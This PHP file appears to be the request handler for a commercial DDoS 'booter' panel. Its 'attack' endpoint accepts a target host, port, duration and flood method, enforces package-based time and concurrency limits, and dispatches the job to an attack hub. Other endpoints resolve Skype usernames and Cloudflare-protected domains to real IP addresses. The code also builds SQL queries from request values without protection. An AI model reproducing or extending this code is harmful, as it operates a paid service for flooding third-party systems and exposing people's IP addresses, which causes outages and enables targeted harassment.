<?php
require_once('global.php');

if($_POST['logins']) {
	$uname = $xlog->filter($_POST['u']);
	$pass = $xlog->filter($_POST['p']);
	if(empty($uname) || empty($pass)) {
		die('empty-field');
	}
	switch($users->login($uname, $pass)) {
		case 'user-not-exists':
			die('invalid-info');
			break;
		case 'pass-auth-failed':
			die('invalid-info');
			break;
		case 'user-banned':
			die('user-banned');
			break;
		case 'user-auth-success':
			die('user-auth-success');
			break;
	}
}
if($_POST['rver']) {
	$uname = $xlog->filter($_POST['user']);
	$pass = $xlog->filter($_POST['pass']);
	$uinfo = $dbc->query("SELECT * FROM `users` WHERE `username`='$uname' LIMIT 1");
	if($dbc->num($uinfo) != 0) {
		die('user-exists');
	}
	$users->register($uname, $pass);
	die('success');
}

if($_POST['attack']) {
	$host = $xlog->filter($_POST['host']);
	$port = $xlog->filter($_POST['port']);
	$time = $xlog->filter($_POST['time']);
	$method = $xlog->filter($_POST['meth']);
	
	
	$host = str_replace('http://', '', $host);
	$host = str_replace('www.', '', $host);
	$host = str_replace('/', '', $host);
	$htest = explode('.', $host);
	if((int)end($htest)) {
		// host is ip addr
		if(count($htest) != 4) { // can't be IP addr! not enough blocks!
			die('host-ip-error');
		} else {
			foreach($htest as $v) { // test for ONLY ints
				if(!(int)$v || strlen($v) > 3) {
					die('host-ip-error');
				}
			}
			// all should be ok here...
		}
	} else {
		// host is website
		
	}
	if(!(int)$port) {
		// ANY errors with port, just make it 80...
		$port = 80;
	}
	$ttest = explode(' ', $time); // break where 'sec' starts
	$time = $ttest[0];
	$uinfo = $users->info_id($_SESSION['id']);
	if($uinfo['package'] != 0) {
		$pinfo = $users->pack_info($uinfo['package']);
	} else { 
		if($uinfo['level'] == 5) {
			// do nothing, admin
			$pinfo['max_attack_time'] = 1000;
			$pinfo['max_concurrent'] = 1000;
		} else {
			die('perm-error');
		}
	}
	// perm!
	if($time > $pinfo['max_attack_time']) {
		$time = $pinfo['max_attack_time'];
	}
	// find running attacks:
	$my_attacks = $dbc->query("SELECT * FROM `attacks` WHERE `uid`='$_SESSION[id]' AND `end_date` > NOW");
	if($dbc->num($my_attacks) > $pinfo['max_concurrent']) {
		die('too-many-attacks');
	}
	
	// NOW we're all good!
	$vals = array(
				'host' => $host,
				'time' => $time,
				'port' => $port,
				'method' => $method
			);
	$core->hub_send_attack($vals);
}

if($_POST['regsub']) {
	$usern = $xlog->filter($_POST['user']);
	$pass = $xlog->filter($_POST['pass1']);
	$email = $xlog->filter($_POST['email1']);
	if($users->exists2($usern, $email) == true) {
		die('user-exists');
	} else {
		$users->register($usern, $email, $pass);
		die('reg-success');
	}
}
if($_POST['sh2ip']) {
	$host = $xlog->filter($_POST['input']);
	die($h2ip->getIp($host));
}
if($_POST['sk2ip']) {
	$host = $xlog->filter($_POST['input']);
	die($skype->get_ip($host));
}
if($_POST['c2ip']) {
	$host = $xlog->filter($_POST['input']);
	die($cfres->resolve($host, 0,0));
}
if($_POST['xcheck']) {
	$host = $xlog->filter($_POST['input']);
	die($xbl->get_status($host));
}	
if($_POST['runlivechat']) {
	$q = $dbc->query("SELECT *, DATE_FORMAT(date, '%b %e, at %r') as ndate FROM `live_chat` ORDER BY `date` DESC LIMIT 10");
	$data = '';
	while($row = $dbc->fetch_array($q)) {
		$data .= '<tr>
					<td>' .$row['message'] . '</td>
					<td><b class="bold">' .$users->info_id($row['uid'])['username']. '</b></td>
					<td>' .$row['ndate']. '</td>
				  </tr>';
	}
	die($data);
}
if($_POST['postlivechat']) {
	/*if($user->info_id($_SESSION['id'])['level'] != 5) {
		die();
	} */
	$msg = $xlog->filter($_POST['msg']);
	$uid = $_SESSION['id'];
	if($msg == '') {
		die();
	}
	$dbc->query("INSERT INTO `live_chat` (`message`, `date`, `uid`) VALUES ('$msg', NOW(), '$uid');");
}
if($_POST['chpass']) {
	$p1 = $xlog->filter($_POST['cp1']);
	$p2 = $xlog->filter($_POST['cp2']);
	if($p1 == $p2 && !empty($p1) && !empty($p2)) {
		// all good
		$pass = $password->create($p1);
		$dbc->query("UPDATE `users` SET `password`='$pass[pass]', `salt`='$pass[salt]' WHERE `id`='$_SESSION[id]' LIMIT 1");
		die('success');
	} else {
		die();
	}
}
?>
